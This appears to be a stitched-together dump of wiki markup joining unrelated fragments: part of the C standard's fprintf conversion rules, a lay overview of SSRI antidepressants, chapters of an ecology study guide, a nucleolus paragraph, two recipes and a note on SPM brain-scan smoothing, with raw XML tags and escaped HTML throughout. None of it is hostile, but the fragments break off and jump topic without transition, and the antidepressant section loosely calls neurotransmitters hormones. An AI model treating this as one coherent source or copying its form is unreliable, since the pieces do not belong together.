; &lt;tt&gt;o&lt;/tt&gt;, &lt;tt&gt;u&lt;/tt&gt;, &lt;tt&gt;x&lt;/tt&gt;, &lt;tt&gt;X&lt;/tt&gt; : The &lt;code&gt;unsigned int&lt;/code&gt; argument is converted to unsigned octal (&lt;tt&gt;o&lt;/tt&gt;), unsigned decimal (&lt;tt&gt;u&lt;/tt&gt;), or unsigned hexadecimal notation (&lt;tt&gt;x&lt;/tt&gt; or &lt;tt&gt;X&lt;/tt&gt;) in the style &lt;i&gt;dddd&lt;/i&gt;; the letters &lt;tt&gt;&lt;b&gt;abcdef&lt;/b&gt;&lt;/tt&gt; are used for &lt;tt&gt;x&lt;/tt&gt; conversion and the letters &lt;tt&gt;&lt;b&gt;ABCDEF&lt;/b&gt;&lt;/tt&gt; for &lt;tt&gt;X&lt;/tt&gt; conversion. The precision specifies the minimum number of digits to appear; if the value being converted can be represented in fewer digits, it is expanded with leading zeros. The default precision is 1. The result of converting a zero value with a precision of zero is no characters.

; &lt;tt&gt;f&lt;/tt&gt;, &lt;tt&gt;F&lt;/tt&gt; : A &lt;code&gt;double&lt;/code&gt; argument representing a (finite) floating-point number is converted to decimal notation in the style &lt;i&gt;[&lt;/i&gt;&lt;tt&gt;−&lt;/tt&gt;&lt;i&gt;]ddd&lt;/i&gt;&lt;tt&gt;.&lt;/tt&gt;&lt;i&gt;ddd&lt;/i&gt;, where the number of digits after the decimal-point character is equal to the precision specification. If the precision is missing, it is taken as 6; if the precision is zero and the &lt;tt&gt;#&lt;/tt&gt; flag is not specified, no decimal-point character appears. If a decimal-point character appears, at least one digit appears before it. The value is rounded to the appropriate number of digits.&lt;br&gt;(C99) A &lt;code&gt;double&lt;/code&gt; argument representing an infinity is converted in one of the styles &lt;i&gt;[&lt;/i&gt;&lt;tt&gt;-&lt;/tt&gt;&lt;i&gt;]&lt;/i&gt;&lt;tt&gt;inf&lt;/tt&gt; or &lt;i&gt;[&lt;/i&gt;&lt;tt&gt;-&lt;/tt&gt;&lt;i&gt;]&lt;/i&gt;&lt;tt&gt;infinity&lt;/tt&gt; &amp;mdash; which style is implementation-defined. A double argument representing a NaN is converted in one of the styles &lt;i&gt;[&lt;/i&gt;&lt;tt&gt;-&lt;/tt&gt;&lt;i&gt;]&lt;/i&gt;&lt;tt&gt;nan&lt;/tt&gt; or &lt;i&gt;[&lt;/i&gt;&lt;tt&gt;-&lt;/tt&gt;&lt;i&gt;]&lt;/i&gt;&lt;tt&gt;nan(&lt;/tt&gt;&lt;i&gt;n-char-sequence&lt;/i&gt;&lt;tt&gt;)&lt;/tt&gt; &amp;mdash; which style, and the meaning of any &lt;i&gt;n-char-sequence&lt;/i&gt;, is implementation-defined. The &lt;tt&gt;F&lt;/tt&gt; conversion specifier produces &lt;tt&gt;INF&lt;/tt&gt;, &lt;tt&gt;INFINITY&lt;/tt&gt;, or &lt;tt&gt;NAN&lt;/tt&gt; instead of &lt;tt&gt;inf&lt;/tt&gt;, &lt;tt&gt;infinity&lt;/tt&gt;, or &lt;tt&gt;nan&lt;/tt&gt;, respectively. (When applied to infinite and NaN values, the &lt;tt&gt;-&lt;/tt&gt;, &lt;tt&gt;+&lt;/tt&gt;, and &lt;i&gt;space&lt;/i&gt; flags have their usual meaning; the &lt;tt&gt;#&lt;/tt&gt; and &lt;tt&gt;0&lt;/tt&gt; flags have no effect.)

; &lt;tt&gt;e&lt;/tt&gt;, &lt;tt&gt;E&lt;/tt&gt; : A &lt;code&gt;double&lt;/code&gt; argument representing a (finite) floating-point number is converted in the style &lt;i&gt;[&lt;/i&gt;&lt;tt&gt;−&lt;/tt&gt;&lt;i&gt;]d&lt;/i&gt;&lt;tt&gt;.&lt;/tt&gt;&lt;i&gt;ddd&lt;/i&gt;&lt;tt&gt;e&amp;plusmn;&lt;/tt&gt;&lt;i&gt;dd&lt;/i&gt;, where there is one digit (which is nonzero if the argument is nonzero) before the decimal-point character and the number of digits after it is equal to the precision; if the precision is missing, it is taken as 6; if the precision is zero and the &lt;tt&gt;#&lt;/tt&gt; flag is not specified, no decimal-point character appears. The value is rounded to the appropriate number of digits. The &lt;tt&gt;E&lt;/tt&gt; conversion specifier produces a number with &lt;tt&gt;E&lt;/tt&gt; instead of &lt;tt&gt;e&lt;/tt&gt; introducing the exponent. The exponent always contains at least two digits, and only as many more digits as necessary to represent the exponent. If the value is zero, the exponent is zero.&lt;br&gt;(C99) A &lt;code&gt;double&lt;/code&gt; argument representing an infinity or NaN is converted in the style of an &lt;tt&gt;f&lt;/tt&gt; or &lt;tt&gt;F&lt;/tt&gt; conversion specifier.

; &lt;tt&gt;g&lt;/tt&gt;, &lt;tt&gt;G&lt;/tt&gt; : A &lt;code&gt;double&lt;/code&gt; argument representing a (finite) floating-point number is converted in style &lt;tt&gt;f&lt;/tt&gt; or &lt;tt&gt;e&lt;/tt&gt; (or in style &lt;tt&gt;F&lt;/tt&gt; or &lt;tt&gt;E&lt;/tt&gt; in the case of a &lt;tt&gt;G&lt;/tt&gt; conversion specifier), with the precision specifying the number of significant digits. If the precision is zero, it is taken as 1. The style used depends on the value converted; style &lt;tt&gt;e&lt;/tt&gt; (or &lt;tt&gt;E&lt;/tt&gt;) is used only if the exponent resulting from such a conversion is less than &amp;ndash;4 or greater than or equal to the precision. Trailing zeros are removed from the fractional portion of the result unless the &lt;tt&gt;#&lt;/tt&gt; flag is specified; a decimal-point character appears only if it is followed by a digit.&lt;br&gt;(C99) A &lt;code&gt;double&lt;/code&gt; argument representing an infinity or NaN is converted in the style of an &lt;tt&gt;f&lt;/tt&gt; or &lt;tt&gt;F&lt;/tt&gt; conversion specifier.

; &lt;tt&gt;a&lt;/tt&gt;, &lt;tt&gt;A&lt;/tt&gt; : (C99) A double argument representing a (finite) floating-point number is converted in the style &lt;i&gt;[&lt;/i&gt;&lt;tt&gt;−&lt;/tt&gt;&lt;i&gt;]&lt;/i&gt;&lt;tt&gt;0x&lt;/tt&gt;&lt;i&gt;h&lt;/i&gt;&lt;tt&gt;.&lt;/tt&gt;&lt;i&gt;hhhh&lt;/i&gt;&lt;tt&gt;p&amp;plusmn;&lt;/tt&gt;&lt;i&gt;d&lt;/i&gt;, where there is one hexadecimal digit (which is nonzero if the argument is a normalized floating-point number and is otherwise unspecified) before the decimal-point character (Binary implementations can choose the hexadecimal digit to the left of the decimal-point character so that subsequent digits align to nibble [4-bit] boundaries.) and the number of hexadecimal digits after it is equal to the precision; if the precision is missing and &lt;code&gt;FLT_RADIX&lt;/code&gt; is a power of 2, then the precision is sufficient for an exact representation of the value; if the precision is missing and &lt;code&gt;FLT_RADIX&lt;/code&gt; is not a power of 2, then the precision is sufficient to distinguish (The precision &lt;i&gt;p&lt;/i&gt; is sufficient to distinguish values of the source type if 16&lt;sup&gt;&lt;i&gt;p&lt;/i&gt;&amp;ndash;1&lt;/sup&gt; &gt; &lt;i&gt;b&lt;sup&gt;n&lt;/sup&gt;&lt;/i&gt; where &lt;i&gt;b&lt;/i&gt; is &lt;code&gt;FLT_RADIX&lt;/code&gt; and &lt;i&gt;n&lt;/i&gt; is the number of base-&lt;i&gt;b&lt;/i&gt; digits in the significand of the source type. A smaller &lt;i&gt;p&lt;/i&gt; might suffice depending on the implementation's scheme for determining the digit to the left of the decimal-point character.) values of type &lt;code&gt;double&lt;/code&gt;, except that trailing zeros may be omitted; if the precision is zero and the &lt;tt&gt;#&lt;/tt&gt; flag is not specified, no decimal-point character appears. The letters &lt;tt&gt;&lt;b&gt;abcdef&lt;/b&gt;&lt;/tt&gt; are used for &lt;tt&gt;a&lt;/tt&gt; conversion and the letters &lt;tt&gt;&lt;b&gt;ABCDEF&lt;/b&gt;&lt;/tt&gt; for &lt;tt&gt;A&lt;/tt&gt; conversion. The &lt;tt&gt;A&lt;/tt&gt; conversion specifier produces a number with &lt;tt&gt;X&lt;/tt&gt; and &lt;tt&gt;P&lt;/tt&gt; instead of &lt;tt&gt;x&lt;/tt&gt; and &lt;tt&gt;p&lt;/tt&gt;. The exponent always contains at least one digit, and only as many more digits as necessary to represent the decimal exponent of 2. If the value is zero, the exponent is zero.&lt;br&gt;A &lt;code&gt;double&lt;/code&gt; argument representing an infinity or NaN is converted in the style of an &lt;tt&gt;f&lt;/tt&gt; or &lt;tt&gt;F&lt;/tt&gt; conversion specifier.

; &lt;tt&gt;c&lt;/tt&gt; : If no &lt;tt&gt;l&lt;/tt&gt; length modifier is present, the &lt;code&gt;int&lt;/code&gt; argument is converted to an &lt;code&gt;unsigned char&lt;/code&gt;, and the resulting character is written.&lt;br&gt;(C99) If an &lt;tt&gt;l&lt;/tt&gt; length modifier is present, the &lt;code&gt;wint_t&lt;/code&gt; argument is converted as if by an &lt;tt&gt;ls&lt;/tt&gt; conversion specification with no precision and an argument that points to the initial element of a two-element array of &lt;code&gt;wchar_t&lt;/code&gt;, the first element containing the &lt;code&gt;wint_t&lt;/code&gt; argument to the &lt;tt&gt;lc&lt;/tt&gt; conversion specification and the second a null wide character.

; &lt;tt&gt;s&lt;/tt&gt; : If no &lt;tt&gt;l&lt;/tt&gt; length modifier is present, the argument shall be a pointer to the initial element of an array of character type. (No special provisions are made for multibyte characters.) Characters from the array are written up to (but not including) the terminating null character. If the precision is specified, no more than that many characters are written. If the precision is not specified or is greater than the size of the array, the array shall contain a null character.&lt;br&gt;(C99) If an &lt;tt&gt;l&lt;/tt&gt; length modifier is present, the argument shall be a pointer to the initial element of an array of &lt;code&gt;wchar_t&lt;/code&gt; type. Wide characters from the array are converted to multibyte characters (each as if by a call to the &lt;code&gt;wcrtomb&lt;/code&gt; function, with the conversion state described by an &lt;code&gt;mbstate_t&lt;/code&gt; object initialized to zero before the first wide character is converted) up to and including a terminating null wide character. The resulting multibyte characters are written up to (but not including) the terminating null character (byte). If no precision is specified, the array shall contain a null wide character. If a precision is specified, no more than that many characters (bytes) are written (including shift sequences, if any), and the array shall contain a null wide character if, to equal the multibyte character sequence length given by the precision, the function would need to access a wide character one past the end of the array. In no case is a partial multibyte character written. (Redundant shift sequences may result if multibyte characters have a state-dependent encoding.)

; &lt;tt&gt;p&lt;/tt&gt; : The argument shall be a pointer to &lt;code&gt;void&lt;/code&gt;. The value of the pointer is converted to a sequence of printable characters, in an implementation-defined manner.

; &lt;tt&gt;n&lt;/tt&gt; : The argument shall be a pointer to signed integer into which is written the number of characters written to the output stream so far by this call to &lt;code&gt;fprintf&lt;/code&gt;. No argument is converted, but one is consumed. If the conversion specification includes any flags, a field width, or a precision, the behavior is undefined.

; &lt;tt&gt;%&lt;/tt&gt; : A &lt;tt&gt;%&lt;/tt&gt; character is written. No argument is converted. The complete conversion specification shall be &lt;tt&gt;%%&lt;/tt&gt;.

If a conversion specification is invalid, the behavior is undefined. If any argument is not the correct type for the corresponding coversion specification, the behavior is undefined.

In no case does a nonexistent or small field width cause truncation of a field; if the result of a conversion is wider than the field width, the field is expanded to contain the conversion result.

For &lt;tt&gt;a&lt;/tt&gt; and &lt;tt&gt;A&lt;/tt&gt; conversions, if &lt;code&gt;FLT_RADIX&lt;/code&gt; is a power of 2, the value is correctly rounded to a hexadecimal floating number with the given precision.

It is recommended practice that if &lt;code&gt;FLT_RADIX&lt;/code&gt; is not a power of 2, the result should be one of the two adjacent numbers in hexadecimal floating style with the given precision, with the extra stipulation that the error should have a correct sign for the current rounding direction.

It is recommended practice that for &lt;tt&gt;e&lt;/tt&gt;, &lt;tt&gt;E&lt;/tt&gt;, &lt;tt&gt;f&lt;/tt&gt;, &lt;tt&gt;F&lt;/tt&gt;, &lt;tt&gt;g&lt;/tt&gt;, and &lt;tt&gt;G&lt;/tt&gt; conversions, if the number of significant decimal digits is at most &lt;code&gt;DECIMAL_DIG&lt;/code&gt;, then the result should be correctly rounded. (For binary-to-decimal conversion, the result format's values are the numbers representable with the given format specifier. The number of significant digits is determined by the format specifier, and in the case of fixed-point conversion by the source value as well.) If the number of significant decimal digits is more than &lt;code&gt;DECIMAL_DIG&lt;/code&gt; but the source value is exactly representable with &lt;code&gt;DECIMAL_DIG&lt;/code&gt; digits, then the result should be an exact representation with trailing zeros. Otherwise, the source value is bounded by two adjacent decimal strings &lt;i&gt;L &lt; U&lt;/i&gt;, both having &lt;tt&gt;DECIMAL_DIG&lt;/tt&gt; significant digits; the value of the resultant decimal string &lt;i&gt;D&lt;/i&gt; should satisfy &lt;i&gt;L &amp;le; D &amp;le; U&lt;/i&gt;, with the extra stipulation that the error should have a correct sign for the current rounding direction.

The &lt;code&gt;fprintf&lt;/code&gt; function returns the number of characters transmitted, or a negative value if an output or encoding error occurred.

The &lt;code&gt;printf&lt;/code&gt; function is equivalent to &lt;code&gt;fprintf&lt;/code&gt; with the argument &lt;code&gt;stdout&lt;/code&gt; interposed before the arguments to &lt;code&gt;printf&lt;/code&gt;. It returns the number of characters transmitted, or a negative value if an output error occurred.

The &lt;code&gt;sprintf&lt;/code&gt; function is equivalent to &lt;code&gt;fprintf&lt;/code&gt;, except that the argument &lt;code&gt;s&lt;/code&gt; specifies an array into which the generated input is to be written, rather than to a stream. A null character is written at the end of the characters written; it is not counted as part of the returned sum. If copying takes place between objects that overlap, the behavior is undefined. The function returns the number of characters written in the array, not counting the terminating null character.

The &lt;code&gt;vfprintf&lt;/code&gt; function is equivalent to &lt;code&gt;fprintf&lt;/code&gt;, with the variable argument list replaced by &lt;code&gt;arg&lt;/code&gt;, which shall have been initialized by the &lt;code&gt;va_start&lt;/code&gt; macro (and possibly subsequent &lt;code&gt;va_arg&lt;/code&gt; calls). The &lt;code&gt;vfprintf&lt;/code&gt; function does not invoke the &lt;code&gt;va_end&lt;/code&gt; macro. The function returns the number of characters transmitted, or a negative value if an output error occurred.

The &lt;code&gt;vprintf&lt;/code&gt; function is equivalent to &lt;code&gt;printf&lt;/code&gt;, with the variable argument list replaced by &lt;code&gt;arg&lt;/code&gt;, which shall have been initialized by the &lt;code&gt;va_start&lt;/code&gt; macro (and possibly subsequent &lt;code&gt;va_arg&lt;/code&gt; calls). The &lt;code&gt;vprintf&lt;/code&gt; function does not invoke the &lt;code&gt;va_end&lt;/code&gt; macro. The function returns the number of characters transmitted, or a negative value if an output error occurred.

The &lt;code&gt;vsprintf&lt;/code&gt; function is equivalent to &lt;code&gt;sprintf&lt;/code&gt;, with the variable argument list replaced by &lt;code&gt;arg&lt;/code&gt;, which shall have been initialized by the &lt;code&gt;va_start&lt;/code&gt; macro (and possibly subsequent &lt;code&gt;va_arg&lt;/code&gt; calls). The &lt;code&gt;vsprintf&lt;/code&gt; function does not invoke the &lt;code&gt;va_end&lt;/code&gt; macro. If copying takes place between objects that overlap, the behavior is undefined. The function returns the number of characters written into the array, not counting the terminating null character.

      <text xml:space="preserve">Depression is a common condition. It may be situational, or may be due to an imbalance of hormones in the brain (Clinical Depression). Although there is no laboratory test for depression, and experienced clinician can make diagnosis based on history and observation, and recommend medication to correct a likely imbalance.

The most commonly prescribed antidepressants are currently the Selective Serotonin Reuptake Inhibitors (SSRI). This type of antidepressant has mostly replaced older ones (e.g. Monoamine Oxidase Inhibitors (MAOI), Tricyclic Antidepressants (TCAs)). The SSRIs are generally considered to be more effective than the older types, and are typically considered safer and therefore preferable for use in depressed patients who may feel suicidal. Prozac (fluoxetine) was the first SSRI in the United States (Luvox (Fluvoxamine) being the first worldwide). 

One theory of depression is a depressed level of serotonin (there may also be an connection with an imbalance in other neurotransmitters such as dopamine and/or norepinephrine).  SSRIs act by inhibiting the reuptake of serotonin elevating available serotonin levels (it does not cause more serotonin to be created).  Antidepressants (including SSRIs) can alter the level of more than one neurotransmitter simultaneously.  The affinity for other neurotransmitters will vary depending on the particular drug considered.  Though some types of antidepressants have been designed to have a high affinity for multiple neurotransmitters (e.g. Effexor (venlafaxine) which inhibits the reuptake of both serotonin and norepinephrine).

Antidepressants usually take 2 to 6 weeks for take effect. Though treatment with an antidepressant should be reassessed at regular intervals (e.g. every couple of months) to see if continued usage is warranted.

Common side effects of SSRIs include (but are not limited to) dry mouth, nausea, sedation, headache, sweating, GI issues, weight gain/loss and issues with libido. These effects usually subside within a couple weeks, though the weight and libido issues may persist throughout the duration of treatment.

Some people may experience an increase in impulsivity or suicidal ideation with these medications.  Thus, the prescribing physician should be contacted upon any such out of character mood or conduct.

Caution should be used when discontinuing an antidepressant. The dosage should be reduced gradually over time (dependant on the particular drugs half-life) to reduce the chances or severity of symptoms of a discontinuation syndrome.

      <text xml:space="preserve">The purpose of the ''A Study Guide to Basic Ecology'' is to weave&amp;mdash;out of the information on Life Science contained in ''Wikipedia''&amp;mdash;a course of study for the student or layman.  It is anticipated that this course will be either supplemental to instruction being received at a school or college, or will be self-directed. We hope to include, within each chapter, sufficient text to make clear the concepts important to understanding life on earth from an ecological perspective. However, acquiring this knowledge will require a careful reading of assigned articles in Wikipedia. Thus, each module presents one or more &quot;reading assignments&quot; of the form:

:*Read [[w:Ecology|Ecology]] (&lt;small&gt;Links need not be pursued at this time&lt;/small&gt;) 

Following (that is ''clicking'' on) the link (to ''Wikipedia'' &quot;Ecology&quot; article in this case) will open the article intended to provide the details of the Chapter subsection. Recommended articles should be read from top to bottom, and then re-read following some or all of the links embedded in the article to other articles for expanded elucidation or to clarify terms; that is, in most cases, completion of an &quot;assignment&quot; (recommended article) includes at least some or all articles linked to the first.  Obviously, it cannot be the case that all links are followed to articles, whose links are then followed to articles, and so on until no new material is encountered. It is likely there would be no quick end to such a pursuit. The amount of time spent wandering beyond the original article is partly a personal matter of how much the reader is getting out of the foray than anything else. Realize it is certainly possible to wander well off the subject at hand.  As in the example above, notes are provided with assignments giving some direction for pursuing links. An instruction NOT to pursue links simply means the additional material will likely be encountered later in the course of instruction, and going beyond the assigned article may provide too much detail for a course in &quot;basic&quot; ecology.  The following example: 

:* Read [[Wikipedia:en:Science|Science]] (&lt;small&gt;The following links are included:&lt;/small&gt;)
:** [[Wikipedia:en:Scientific method|Scientific Method]]
:** [[Wikipedia:en:Philosophy of science|Philosophy of Science]]

specifies that two other links ARE part of the assignment.  Other links encountered may be followed to expand your knowledge or, as always, to aid in understanding of technical terms encountered. Occasional hyperlinks included within the text in the Guide (that is, separate from the assignments) are there simply for convenience, usually to topics somewhat peripheral to the main one or to terms you should be familiar with but may not be.  In all cases, finding your way back to the Guide may be tricky, but we must leave this up to you to establish, beyond pointing out that your browser's ''Back'' button is intended for this purpose.   

Note that at the beginning of each module, links are provided to both the previous chapter and the succeeding chapter, as well as to the main Table of Contents.

== Final Note ==
 
As [[../A final note about the Guide|a final note]], read the next Section and consider how you might even make a contribution to the Guide.

      <text xml:space="preserve">The nucleolus is the only structure in the nucleus that is detectable in a light microscope without staining. It is the site of rRNA synthesis. (rRNA or ribosomal RNA is an essential part of ribosomes, the structures in the Cytoplasma where proteins are made from mRNA templates.) The nucleolus contains many rDNA genes from which the rRNA is made. The human genome contains 10 chromosomes with arrays of rDNA genes (two copies of chromosomes 13, 14, 15, 21 and 22) but not all of these arrays are necessarily actively used in all cells.

&lt;big&gt;&lt;big&gt;Chapter 2. Organization within the Biosphere&lt;/big&gt;&lt;/big&gt;  
&lt;/center&gt;
----


== Units of the Biosphere == 
You have been presented with a definition of the term '''biosphere''' above. This chapter will consider the question: '''How is the ''biosphere'' organized?''' We will initially look at this organization over a range of scales so to familiarize you to important terms used in ecology. In later chapters, we will cover the details and significance of the concepts only introduced here.   
[[Image:Swamp_lake_Balarus.jpg|350px|thumb|right|A large pond and wetlands near Minsk. We can easily recognize a hydrosphere, an atmosphere, and a lithosphere, the latter dominated in some  areas by yellowing grasses or sedges, in other areas by trees.]]  

Ecologists regard  ''ecosystems'' as basic structural units, implying that the biosphere is a collection or mosaic of definable ecosystems. However, an ecosystem is really more conceptual than actual. By this we mean that the definable boundaries of an ecosystem are more in the mind of the ecologist than geographical. We can certainly observe that there are many boundaries in nature&amp;mdash;some fairly sharp&amp;mdash;and what we are observing are physical manifestations  between volumes wherein different conditions prevail. These are '''biocycles''', subdivisions of the biosphere. Consider a lake shore, or even the water surface for that matter; the transitions between the biocycles&amp;mdash;land, the air or atmosphere, and the body of water&amp;mdash;are sharp and recognizable upon casual inspection.  But are they really?

There is no doubt that under gravity, water in the liquid phase sorts itself out from gaseous air&amp;mdash;a lake surface exists.  But along the shore, the water moves into the earth wherever the soil or voids in the rock allow. Constantly water-saturated soil becomes a wetland. Further, atmospheric gases dissolve in the water of the lake, and molecules of water move off the lake as gaseous moisture, evident perhaps as fog on a cool morning. The sharpness of the boundaries is both actual and illusionary. Actual, because conditions encountered within each of the separate spaces or volumes (air, land, water) are very different. Illusionary, because no biocycle is completely isolated from adjacent biocycles, and typically each has influence over the other.

We have, so far considered just the physical environment. Ecosystems include organisms. And we can expect that most, though certainly not all, organisms will sort themselves out along the same physical boundaries described. That is, fish will find life conditions suitable only in the lake; conifers only in the uplands. Yet organisms are no more isolated from adjacent biocycles than are the substances of the physical world.  The food of many fish will be insects living only on the land and moving through the atmosphere, which upon death or by accident, fall into the water. The conifers draw up moisture from the earth, some directly from the lake or the groundwater body connected to the lake. Ecologists use the term '''biotope''' to mean a topographic unit characterized by a particular set of physical conditions and a uniform assemblage of plant and animal species. Considering our example above, the lake is part of the major freshwater ''biocycle'' and would be a ''biotope'' of the region in which it is located, being perhaps just one of many ponds and lakes comprising that biotope.  A '''biochore''' is a subdivision of the biosphere consisting of the biotopes that resemble one another; thus, our lake is but one example of the temperate zone, freshwater, lake ''biochore''. 

The terms &quot;biotope&quot;, &quot;biochore&quot;, and &quot;biocycle&quot; fill a need in descriptive ecology.  We can speak in a general way about the life forms and climatic conditions that constitute a desert biochore, or a northern forest biochore. And we can describe, from our example illustrated by the photograph, lake, marsh, and upland forest biotopes, each with a distinct listing of species perhaps unique to just that geographical region near Minsk (in our photo example), or more broadly represented across the continent.

== Gaia Theory ==

Consider the importance of the functional relationships between species comprising an ecosystem, and how those relationships contribute to the very survival of the ecosystem. Consider that ecosystems are not, in most cases, isolated units, but parts of a larger functioning whole, at its broadest being the biosphere.  Is it possible that biosphere&amp;mdash;all life on earth and at least those physical things utilized and modified by life on earth&amp;mdash;is one, large integrated system?   
* Read [[Wikipedia:en:Gaia theory (science)|Gaia Theory]] (&lt;small&gt;Follow links that interest you.&lt;/small&gt;) 

== Species and Habitat ==

In biology, the concept of '''species''' is basic.  A species comprises a group of related organisms that share a more or less distinctive form and are capable of interbreeding. According to Ernst Mayr, species are:
:''groups of actually or potentially interbreeding natural populations which are reproductively isolated from other such groups''.

* Read [[Wikipedia:en:Species|Species]] (&lt;small&gt;Although you will be familiar with this material from biology studies, you should explore the topic to satisfy a more complete understanding&lt;/small&gt;) 

In biology, it is generally the case that focus on the species concept is largely the concern of taxonomy and taxonomists.  In ecology, the more important aspect is that of the '''[[Wikipedia:en:population|species population]]''' (or '''population''' as we shall more often use the term). Note in Mayr's simple definition, that &quot;interbreeding populations&quot; is somewhat central. In ecology we are less concerned with all considerations of what &quot;potentially interbreeding&quot; might mean and more interested in the group of individuals that are, in fact, interbreeding.  By which is meant, not that sexual reproduction must take place between all extant (living at the same time) members, but that there exists a gene pool that is open and potentially contributed to by each member. The concept of species would admit all those individuals separated by great distances and physical barriers as included if breeding could still take place.  The species population takes into account the isolation that might actually exist, frequently dividing a single species into more than one population. Within the population, [[Wikipedia:en:allele|alleles]] presumably flow freely through time, held (at any given point in time) within the nuclei of the cells of the individual organisms constituting the population.
 
Using the term habitat in describing the ecological conditions surrounding an assemblage of species or a community, we are speaking of a ''biotope''. Many ecologists extend the term habitat in the manner originally defined to cover physical parameters relative to a community of species, but others would substitute the term &quot;biotope&quot; for &quot;habitat&quot; in such cases. Note that this is not exactly the same as &quot;biotope&quot; defined above, which included the biota as well as the physical or abiotic environment. Odum (1959, p. 28) stated that &quot;habitat... includes other organisms as well as the abiotic environment... [but a] description of the habitat of the community would include only the latter&quot;&amp;mdash;a point of view opposite to that expressed by most ecologists today.

Any term in ecology that attempts to separate the biotic and abiotic components of an ecological unit of organisation will encounter this difficulty.  Consider that if the habitat of a bird is the place it lives, and the bird lives in a pine forest (actually up among the branches of the pine trees), then the physical environment (the &quot;habitat&quot;) of that bird species must include a life form (pine trees); and now extend this reasoning to any manner of invertebrates, such as flea or tapeworm, that really do live most of their life on or in other organisms. A reasonably solid definition of ''habitat'' would be simply '''the environment of a species''' (Sweet, 2005).     

* Read [[Wikipedia:en:Habitat (ecology)|Habitat]] (&lt;small&gt;You need follow links only as necessary to clarify terms; include the following:&lt;/small&gt;)
:* Read [[Wikipedia:en:Biotope|Biotope]] 

A '''niche''' or ''ecological niche'' is essentially what a species does.  We do not mean so much what activities it participates in (although these could be pertinent), but the role the species plays in the functioning of the ecosystem: the &quot;functional status of an organism in its community&quot; (Charles Elton, in Odum, 1959).

* Read [[Wikipedia:en:Ecological niche|Niche]] (&lt;small&gt;You need follow links only as necessary to clarify terms&lt;/small&gt;)

===Habitat Selection===

The choice of habitat affects reproductive success. How do species choose which place to inhabit? Wecker (1963) and Klopfer (1963) determined this choice is partly genetic. It is also partly psychological. Habitat selection is a common behavior among [[Wikipedia:en:Vertebrates|vertebrates]]. [[Wikipedia:en:Garter_snake|Garter snakes]] (''Thamnophis elegans'') choose rocks of intermediate thickness over thicker or thinner rocks, maintaining their preferred body temperature for extended periods (Huey et al. 1989, Huey 1991).
Many species show some flexibility in habitat selection. Organisms are often forced to make these choices, sometimes choosing less suitable habitats. Optimal habitats are occupied more quickly, then marginal habitats, then poor habitats, where reproductive success is limited (Fretwell and Lucas 1969).

We have just touched upon the many aspects of the biology of species populations that concern or interest us as ecologists and this topic will be much expanded upon in Chapter 5 of the ''Guide''.

== Summarization ==
There is but one known '''biosphere''', that of the planet earth.  The biosphere can be subdivided into a number of '''biocycles''', each with fairly specific gross physical characteristics and limited by geography and topography as determined by planetary dynamics, especially gravity. Biocycles are divided into '''biochores''', units with both similar basic physical attributes and life forms. Biochores are made up of a multitude of '''biotopes''', divisions of the landscape that feature both similar physical attributes and a more or less consistent species composition. Some ecologists would use &quot;biotope&quot; for just the physical properties of this level of organisation, and '''biocoenosis''' for the biotic component.  However, such definitional division of highly integrated and complex ecological systems is difficult to uphold. At the level of the species '''population''' (essentially an organism and its relatives), the habitat describes where it is found, where that species occurs in the landscape.  The very different term, '''niche''', describes what that organism does as a functional role in the ecosystem. The ecosystem concept differs from traditional (or the &quot;old&quot;) biology by its clear emphasis on functional relationships among organisms.

'''Hot and Sour Soup''' is a popular soup served at Chinese restaurants in the United States. This version tastes exactly like that served at various Chinese restaurants in California.

==Ingredients==
For the soup:
* 6 cups of [[Cookbook:Chicken|chicken]] [[Cookbook:Stock|stock or broth]] (or 4 cups water and 4 chicken bouillon cubes)
* 4 1/2 [[Cookbook:Tablespoon|tablespoons]] [[Cookbook:Soy Sauce|soy sauce]]
* 1/3 [[Cookbook:Cup|cup]] cooked shredded chicken or [[Cookbook:Pork|pork]]
* 3/4 cup [[Cookbook:Mushroom|mushrooms]], diced
* 3/4 tablespoon garlic chili sauce
* 1/3 [[Cookbook:Teaspoon|teaspoon]] fresh ground black [[Cookbook:Pepper|pepper]]
* 1/3 cup white [[Cookbook:Vinegar|vinegar]]
* 1/2 cup canned [[Cookbook:Bamboo Shoot|bamboo shoots]], [[Cookbook:Julienne|julienned]]
* 4 1/2 [[Cookbook:Ounce|oz]] block of [[Cookbook:Tofu|tofu]], cut into 1/4 inch dice
* 3 tablespoons [[Cookbook:Cornstarch|cornstarch]] and 2 tablespoons cold water
* 1 1/2 [[Cookbook:Egg|egg]], beaten
* 3 [[Cookbook:Scallion|green onion]] stalks, diced (including tops)
* 3/4 teaspoon toasted [[Cookbook:Sesame Oil|sesame oil]]

==Procedure==
# Bring chicken broth to a simmer in a 2-quart saucepan.
# Add soy sauce, shredded meat, mushrooms and garlic chili sauce.
# Simmer for five minutes.
# Add black pepper, white vinegar, bamboo shoots, tofu.
# Simmer for five minutes.
# Combine two tablespoons of cornstarch with two tablespoons of cold water in a cup. Stir until mixture is smooth. Add cornstarch mixture to soup and stir well.
# Simmer for five minutes until soup is thickened.
# Beat egg in a cup until yolk and white are combined. Pour beaten egg slowly, in a fine stream into soup. Stir soup several times.
# Wait 30 seconds.
# Add green onions and sesame oil to soup. Stir well. Remove from heat.
# Serve hot.

Makes 4 servings.

==Notes, tips, and variations==
* Adjust vinegar, ground black pepper, garlic chili sauce and soy sauce to taste.  American vinegar is much more acidic than its Chinese counterpart, so start with very little and add slowly.
* Add or remove mushrooms, bamboo shoots, or tofu as needed. These three ingredients don't add much to the taste, mostly they add to the texture of the soup.

'''French Dressing''' is a salad dressing commonly used with green salads.  It can also be used as a sandwich spread, or many other uses. A commercial version is also called &quot;Catalina Dressing&quot;.  

==Ingredients==
*2/3 cup ketchup
*3/4 cup granulated sugar
*1/2 cup white wine vinegar
*1/2 cup vegetable oil
*1/4 cup minced onion 
*2 teaspoons Paprika
*2 teaspoons [[Cookbook:Worcestershire Sauce|Worcestershire sauce]]

Makes about 1 1/2 cups of dressing.

==Procedure==
#Combine all ingredients in a food processor or blender, and process until smooth.  The goal is to have a red / orange smooth sauce.
#Pour the sauce into a bowl and chill covered in the refrigerator for at least 30 minutes prior to use.

==Notes, tips and variations==
* Instead of using the blender, whisk the ingredients in a bowl.

==Warnings==
* Keep refrigerated

      <text xml:space="preserve">'''Spatial smoothing''' is usually performed as a part of the preprocessing of individual brain scans.

In SPM the spatial smoothing is performed with a spatially stationary Gaussian filter where the user must specify the kernel width in mm &quot;full width half max&quot;. Kernel widths of up to 16mm are being used in the literature.

